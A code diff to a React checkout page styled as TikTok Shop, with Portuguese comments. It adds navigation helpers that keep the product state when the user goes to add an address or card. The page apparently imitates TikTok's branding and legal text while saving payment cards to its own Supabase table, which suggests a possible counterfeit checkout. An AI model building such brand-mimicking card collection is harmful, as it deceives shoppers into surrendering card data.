@@ -40,10 +40,8 @@ const Checkout: React.FC = () => {
   const [isSubtotalOpen, setIsSubtotalOpen] = useState(true);
   const [isPlacingOrder, setIsPlacingOrder] = useState(false);
 
-  // Função para buscar dados do Supabase
   const fetchData = async () => {
     try {
-      // Buscar endereço mais recente
       const { data: addresses } = await supabase
         .from('addresses')
         .select('*')
@@ -54,7 +52,6 @@ const Checkout: React.FC = () => {
         setAddressData(addresses[0]);
       }
 
-      // Buscar cartão mais recente
       const { data: cards } = await supabase
         .from('cards')
         .select('*')
@@ -71,14 +68,11 @@ const Checkout: React.FC = () => {
   };
 
   useEffect(() => {
-    // Carregar produto do estado da navegação
     if (location.state?.product) {
       setProduct(location.state.product);
       if (location.state.initialQuantity) setQuantity(location.state.initialQuantity);
       if (location.state.selectedVariation) setSelectedVar(location.state.selectedVariation);
     } else {
-      // Se não houver produto no state, podemos tentar carregar o primeiro da lista como fallback
-      // mas o ideal é que ele venha da navegação.
       navigate('/');
     }
 
@@ -95,10 +89,23 @@ const Checkout: React.FC = () => {
   const finalTotal = subtotal - couponAmount;
   const finalTotalStr = finalTotal.toFixed(2).replace('.', ',');
 
+  // Funções para navegar mantendo o estado
+  const goToAddAddress = () => {
+    navigate('/adicionar-endereco', { 
+      state: { product, initialQuantity: quantity, selectedVariation: selectedVar } 
+    });
+  };
+
+  const goToAddCard = () => {
+    navigate('/adicionar-cartao', { 
+      state: { product, initialQuantity: quantity, selectedVariation: selectedVar } 
+    });
+  };
+
   const handlePlaceOrder = async () => {
     if (!addressData) {
       showError("Por favor, adicione um endereço de entrega.");
-      navigate('/adicionar-endereco');
+      goToAddAddress();
       return;
     }
 
@@ -151,7 +158,7 @@ const Checkout: React.FC = () => {
       </div>
 
       <div className="max-w-[600px] mx-auto">
-        {/* Address Section - Mostrando resumo do endereço */}
+        {/* Address Section */}
         <div className="bg-white p-4 flex items-center justify-between border-b border-gray-100">
           <div className="flex items-center space-x-3">
             <MapPin size={18} className={addressData ? "text-[#00BFA5]" : "text-gray-900"} />
@@ -166,7 +173,7 @@ const Checkout: React.FC = () => {
               )}
             </div>
           </div>
-          <button className="text-[#FF2C55] text-[14px] font-medium" onClick={() => navigate('/adicionar-endereco')}>
+          <button className="text-[#FF2C55] text-[14px] font-medium" onClick={goToAddAddress}>
             {addressData ? "Alterar" : "+ Adicionar endereço"}
           </button>
         </div>
@@ -284,8 +291,7 @@ const Checkout: React.FC = () => {
         <div className="bg-white mt-2.5 p-4 space-y-4">
           <h3 className="text-[16px] font-bold text-gray-900 mb-1">Forma de pagamento</h3>
           
-          {/* Card Option */}
-          <div className="space-y-3 cursor-pointer" onClick={() => navigate('/adicionar-cartao')}>
+          <div className="space-y-3 cursor-pointer" onClick={goToAddCard}>
             <div className="flex items-center justify-between">
               <div className="flex items-center space-x-2">
                 <div className="w-5 h-5 flex items-center justify-center bg-[#F1F1F1] rounded-sm">
@@ -319,7 +325,6 @@ const Checkout: React.FC = () => {
             </div>
           </div>
 
-          {/* Pix Option */}
           <div className="flex items-center justify-between cursor-pointer border-t pt-4 mt-2" onClick={() => setPaymentMethod('pix')}>
             <div className="flex items-center space-x-3">
               <div className="bg-[#EFFFFD] p-1.5 rounded-sm">
@@ -333,7 +338,6 @@ const Checkout: React.FC = () => {
           </div>
         </div>
 
-        {/* Legal Text Section */}
         <div className="p-4 space-y-4">
           <p className="text-[12px] text-gray-600 leading-tight">
             Ao fazer um pedido, você concorda com <span className="font-bold text-gray-900">Termos de uso e venda do TikTok Shop</span> e reconhece que leu e concordou com a <span className="font-bold text-gray-900">Política de privacidade do TikTok</span>.
@@ -348,7 +352,6 @@ const Checkout: React.FC = () => {
         </div>
       </div>
 
-      {/* Footer Fixed */}
       <div className="fixed bottom-0 left-0 right-0 bg-white border-t p-4 z-50">
         <div className="max-w-[600px] mx-auto">
           <div className="flex justify-between items-center mb-3 px-1">
@@ -372,7 +375,7 @@ const Checkout: React.FC = () => {
         isOpen={isPaymentDrawerOpen} 
         onClose={() => setIsPaymentDrawerOpen(false)} 
         onSelectMethod={setPaymentMethod} 
-        onAddCard={() => navigate('/adicionar-cartao')}
+        onAddCard={goToAddCard}
         total={finalTotalStr}
       />
     </div>
